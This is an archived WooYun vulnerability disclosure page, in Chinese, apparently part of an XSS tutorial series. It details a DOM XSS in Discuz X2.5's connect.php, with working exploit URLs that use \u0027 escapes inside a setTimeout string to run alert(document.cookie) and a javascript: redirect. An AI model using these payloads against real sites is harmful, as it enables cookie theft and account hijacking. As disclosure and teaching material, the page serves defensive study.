@@ -1,0 +1,312 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		[腾讯实例教程] 那些年我们一起学XSS - 13. Dom Xss实例 [Discuz X2.5]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		[腾讯实例教程] 那些年我们一起学XSS - 13. Dom Xss实例 [Discuz X2.5]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/心伤的瘦子">心伤的瘦子</a> 
+</li><li>提交时间：		2012-12-24 16:00</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-12-24：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-24：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-01-03：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-01-13：	细节向普通白帽子公开<br/>
+									2013-01-23：	细节向实习白帽子公开<br/>
+									2013-02-07：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">我们教程的DOM XSS就到这里了。最后再给大家送上一个实例。希望大家能够体会到：XSS的上下文非常重要，如何结合上下文，利用未过滤字符，合理的构造，才是成功的关键。<br />
+<br />
+哎，近几天相信别人有世界末日，跑到一个方舟里避难去了。结果3天过后，我发现世界还是如此的精彩，如此的辉煌，我就又出来了。咱们继续。<br />
+<br />
+这年头，码字不容易，求月票。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">1. 我们直接看实例点。<br />
+<br />
+<br />
+<br />
+http://www.discuz.net/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=aaaaaaaaaaa&amp;oauth_token=17993859178940955951&amp;openid=A9446B35E3A17FD1ECBB3D8D42FC126B&amp;oauth_signature=a6DLYVhIXQJeXiXkf7nVdbgntm4%3D&amp;oauth_vericode=3738504772&amp;timestamp=1354305802<br />
+<br />
+<br />
+<br />
+2. 可以看到我们的aaaaaaaaaa在源代码里有2处输出。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/24154654b9a20e845b0f8c048d38d9db2d037368.jpg" target="_blank"><img src="../images/24154654b9a20e845b0f8c048d38d9db2d037368.jpg" alt="62.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 看第2处，我们需要用双引号闭合，但是显然dz不会给我们这么明显的机会，被拦截了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/241547060f6f133b604053830d72cca9c8184680.jpg" target="_blank"><img src="../images/241547060f6f133b604053830d72cca9c8184680.jpg" alt="63.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+4. 我们把目光放在第一处，这一处很特殊，位于setTimeout函数的第一个参数里，setTimeout的第一个函数会将字符串作为脚本来执行。<br />
+<br />
+<br />
+<br />
+我们把这一部分代码提取出来。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&#039;http://www.discuz.net/./aaaaaaaaaaa&#039;;&quot;, 2000);&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们首先能想到的是闭合掉 单引号， 但是这里单引号已经被过滤了。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/2415472178baeea13c310cb3017d2e9c1b635770.jpg" target="_blank"><img src="../images/2415472178baeea13c310cb3017d2e9c1b635770.jpg" alt="64.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+5. 那么是不是就没有办法了呢？我们可以看到setTimeout的第一个参数是字符串；我们前面的教程里说过一次，JS字符串中，字符还可以表示为unicode的形式。即：单引号还可以表示为\u0027或\x27。带着这个想法，我们可以试试\有没有被过滤。<br />
+<br />
+<br />
+<br />
+幸运的是，这里还真没过滤 \<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/24154735abefc2dd5468702e7695dd796409e2fd.jpg" target="_blank"><img src="../images/24154735abefc2dd5468702e7695dd796409e2fd.jpg" alt="65.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+6. 接着我们就是构造代码了。<br />
+<br />
+<br />
+<br />
+首先写好代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&#039;http://www.discuz.net/./a&#039;;alert(document.cookie);a=&#039;&#039;;&quot;, 2000);&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+将里面的引号变为\u0027<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&#039;http://www.discuz.net/./a\u0027;alert(document.cookie);a=\u0027&#039;;&quot;, 2000);&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+代入到URL里。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.discuz.net/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=a\u0027;alert(document.cookie);a=\u0027&amp;oauth_token=17993859178940955951&amp;openid=A9446B35E3A17FD1ECBB3D8D42FC126B&amp;oauth_signature=a6DLYVhIXQJeXiXkf7nVdbgntm4%3D&amp;oauth_vericode=3738504772&amp;timestamp=1354305802</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到弹出了cookies。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/31224929a179a4d602eab7225f277b207e9ed267.png" target="_blank"><img src="../images/31224929a179a4d602eab7225f277b207e9ed267.png" alt="qq123.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+7. 其实这里存在一个问题。 这段JS代码里，第一句是location.href=&quot;某个地址&quot;; 上面我们所演示的，是一个alert，暂停了location.href的发生。<br />
+<br />
+<br />
+<br />
+如果我们把 alert(document.cookie); 换成插入某个JS文件的脚本代码，就会出现问题。<br />
+<br />
+<br />
+<br />
+即：JS文件还没来得及加载，location.href=&quot;某个地址&quot;; 这句就会被执行，从而跳转到另外一个页面了，继而导致失效。<br />
+<br />
+<br />
+<br />
+8. 所以这里，我们有必要改进下执行JS的办法。如下，<br />
+<br />
+<br />
+<br />
+我们可以直接让代码变成执行 location.href=&quot;javascript:alert(document.cookie)&quot;;<br />
+<br />
+<br />
+<br />
+location.href=&#039;原来的字符串&#039;.替换(所有字符,&quot;新的字符&quot;);<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&#039;http://www.discuz.net/./a&#039;.replace(/.+/,/javascript:alert(document.cookie)/.source);//&#039;;&quot;, 2000);&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+同上，替换单引号,加号什么的。<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;script type=&quot;text/javascript&quot; reload=&quot;1&quot;&gt;setTimeout(&quot;window.location.href =&#039;http://www.discuz.net/./a\u0027.replace(/.\u002b/,/javascript:alert(document.cookie)/.source);//&#039;;&quot;, 2000);&lt;/script&gt;</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+最后利用代码。<br />
+<br />
+<br />
+<br />
+</p><pre><code>http://www.discuz.net/connect.php?receive=yes&amp;mod=login&amp;op=callback&amp;referer=a\u0027.replace(/.\u002b/,/javascript:alert(document.cookie)/.source);//&amp;oauth_token=17993859178940955951&amp;openid=A9446B35E3A17FD1ECBB3D8D42FC126B&amp;oauth_signature=a6DLYVhIXQJeXiXkf7nVdbgntm4%3D&amp;oauth_vericode=3738504772&amp;timestamp=1354305802</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以看到，效果一样，这次就不会发生跳转从而导致加载JS失败咯。<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/31225022debe4fea99acbc654a1bb7f2de5b5c73.png" target="_blank"><img src="../images/31225022debe4fea99acbc654a1bb7f2de5b5c73.png" alt="qq345.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+9. 可以看到，这个实例，和前面DOM XSS入门时的例子其实本质上是一样的，不过输出最终进入的函数或者javascript语句不一样。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">见详细说明 </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">过滤掉 \  </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/心伤的瘦子" title="心伤的瘦子">心伤的瘦子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-016437" title="[腾讯实例教程] 那些年我们一起学XSS - 13. Dom Xss实例 [Discuz X2.5]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：中</p>
+						<p class="detail">漏洞Rank：10 </p>
+													<p class="detail">确认时间：2012-12-24 16:48</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="16437";
+var bugRating="2";
+var myRating="";
+var ratingCount="3";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
